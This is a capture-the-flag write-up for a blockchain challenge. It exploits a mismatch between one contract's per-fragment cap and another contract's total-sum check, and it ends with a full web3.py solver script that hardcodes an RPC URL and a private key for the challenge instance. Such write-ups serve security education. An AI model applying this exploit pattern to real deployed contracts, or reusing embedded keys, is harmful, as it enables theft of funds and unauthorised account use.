## C2C CTF - blockchain - Convergence

We are given a Setup contract and a Challenge contract that work together through a ritual system called a “pact”.

The user submits a structured payload (`agreement`) that contains multiple fragments. The Setup contract records the payload hash, and the Challenge contract later decodes the same payload and verifies whether enough total “essence” has been provided.

The goal is to satisfy the Challenge’s ascension requirement and make:

```
setup.isSolved() == true
```

The interesting part is that Setup and Challenge validate the same data differently.

That mismatch is the exploit.

The payload is ABI-encoded and decoded inside the contracts as:

```
(SoulFragment[], bytes32 salt, uint32 epoch, address binder, address witness)
```

Each fragment is a struct:

```
struct SoulFragment {
    address vessel;
    uint256 essence;
    bytes resonance;
}
```

So the payload contains an array of fragments, each contributing some amount of essence.

The system is supposed to enforce two constraints:

Setup contract rule:

```
each fragment essence <= 100 ether
```

Challenge contract rule:

```
total essence >= 1000 ether
```

The designers clearly intended:

> Many small fragments must combine to reach ascension
> 

But they accidentally created a validation gap.

Setup validates fragments **individually**. Challenge validates **only the total sum**. There is no shared invariant guaranteeing both rules are consistent.

That means we can submit:

- many fragments
- each individually valid
- total far beyond intended limits

Below is step by step to exploit the vulnerability:

We craft a payload where:

```
fragment essence = 100 ether  (max allowed)
number of fragments = 11
total essence = 1100 ether
```

This passes Setup’s per-fragment check:

```
100 <= 100
```

And passes Challenge’s total check:

```
1100 >= 1000
```

We satisfy both contracts simultaneously.

First we register with the Challenge contract:

```
challenge.registerSeeker();
```

This marks us as a valid participant. No exploit yet — just setup.

We construct 11 fragments:

```
essence_per_fragment = 100 ether
```

Each fragment:

```
(user_address, 100 ether, 0x00)
```

So the fragment array becomes:

```
[
  (user, 100),
  (user, 100),
  ...
  (user, 100)  // 11 times
]
```

Total:

```
1100 ether
```

Every fragment individually satisfies Setup’s rule.

We ABI-encode:

```
(SoulFragment[], bytes32, uint32, address, address)
```

The solver uses:

```
abi_types = [
  '(address,uint256,bytes)[]',
  'bytes32',
  'uint32',
  'address',
  'address'
]
```

And encodes:

```
encoded_agreement = abi.encode(...)
```

We also include a random salt so the pact hash is unique and hasn’t been recorded before. This avoids collisions in Setup’s `chronicles` mapping.

We submit the payload to Setup:

```
setup.bindPact(encoded_agreement);
```

Setup:

- decodes fragments
- checks each fragment <= 100 ether
- records hash in chronicles

Since all fragments are valid individually. Setup accepts the pact. This is where the system should have rejected the total.

Now we submit the exact same payload to Challenge:

```
challenge.transcend(encoded_agreement);
```

Challenge:

- verifies pact exists in Setup
- decodes fragments
- sums total essence

Result:

```
total = 1100 ether
```

Challenge only checks:

```
total >= 1000 ether
```

So we ascend successfully. No per-fragment validation is re-applied. The contracts disagree about what “valid” means.

After transcend:

```
challenge.ascended() == player
setup.isSolved() == true
```

Challenge solved.

Solver:

```python
import os
import sys
from web3 import Web3

# --- CONFIGURATION ---
RPC_URL = "http://challenges.1pc.tf:44872/7356ca66-4943-4252-a467-05233c7aa229"
PRIVATE_KEY = "f8aa15297c78069e151c89cdcc70ba3dd5388f54526f4ff0ec50e5f1cd476c73"
SETUP_ADDRESS = "0x14dff7d17ced04c09138Eb8A99D2576aC7c41B43"

# --- INITIALIZATION ---
try:
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[!] Critical Error: Cannot connect to RPC URL.")
        sys.exit(1)
    
    account = w3.eth.account.from_key(PRIVATE_KEY)
    user_address = account.address
    print(f"[*] Solver running with user: {user_address}")
except Exception as e:
    print(f"[!] Init failed: {e}")
    sys.exit(1)

# --- ABIS ---
SETUP_ABI = [
    {
        "inputs": [{"internalType": "bytes", "name": "agreement", "type": "bytes"}],
        "name": "bindPact",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {"inputs": [], "name": "challenge", "outputs": [{"internalType": "contract Challenge", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
]

CHALLENGE_ABI = [
    {"inputs": [], "name": "registerSeeker", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "bytes", "name": "truth", "type": "bytes"}], "name": "transcend", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "ascended", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"}
]

def send_tx(func_call, description):
    print(f"[*] {description}...")
    try:
        tx = func_call.build_transaction({
            'from': user_address,
            'nonce': w3.eth.get_transaction_count(user_address),
            'gas': 3000000, # High gas limit to prevent revert on decoding
            'gasPrice': w3.eth.gas_price
        })
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        if receipt.status == 1:
            print(f"    -> Success (Hash: {tx_hash.hex()})")
            return True
        else:
            print("    -> FAILED (Reverted on chain)")
            return False
    except Exception as e:
        print(f"    -> Error: {e}")
        return False

def solve():
    # 1. Setup & Challenge
    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)
    challenge_addr = setup.functions.challenge().call()
    print(f"[*] Found Challenge Address: {challenge_addr}")
    challenge = w3.eth.contract(address=challenge_addr, abi=CHALLENGE_ABI)

    # 2. Register
    send_tx(challenge.functions.registerSeeker(), "Registering Seeker")

    # 3. Construct Payload
    # EXPLOIT: Setup.sol checks fragment <= 100 ether. Challenge.sol checks SUM >= 1000 ether.
    # We use 11 fragments of 100 ether (Total 1100).
    essence_per_fragment = w3.to_wei(100, 'ether')
    
    fragments = []
    for _ in range(11):
        # Struct: (address vessel, uint256 essence, bytes resonance)
        fragments.append((user_address, essence_per_fragment, b'\x00'))

    # Random salt to ensure the hash is unique and hasn't been "chronicled" before
    salt = os.urandom(32)
    
    # Arguments for abi.decode in the contract:
    # (SoulFragment[], bytes32, uint32, address, address)
    full_values = [
        fragments,
        salt,
        0,
        user_address, # binder
        user_address  # witness
    ]
    
    # FIX: Use correct canonical ABI string (removed 'tuple' prefix)
    abi_types = ['(address,uint256,bytes)[]', 'bytes32', 'uint32', 'address', 'address']
    
    print("[*] Encoding payload...")
    encoded_agreement = w3.codec.encode(abi_types, full_values)
    print(f"    -> Encoded length: {len(encoded_agreement)} bytes")

    # 4. Bind Pact (Setup Contract)
    # This records our malicious payload hash in the 'chronicles' mapping
    if not send_tx(setup.functions.bindPact(encoded_agreement), "Binding Pact"):
        print("[!] Bind Pact failed.")
        return

    # 5. Transcend (Challenge Contract)
    # This reads the recorded payload and calculates the total essence
    if not send_tx(challenge.functions.transcend(encoded_agreement), "Transcending"):
        print("[!] Transcend failed.")
        return

    # 6. Verify
    if setup.functions.isSolved().call():
        print("\n[SUCCESS] Flag Captured! Go check the dashboard.")
    else:
        print("\n[FAIL] Not solved.")

if __name__ == "__main__":
    solve()
```
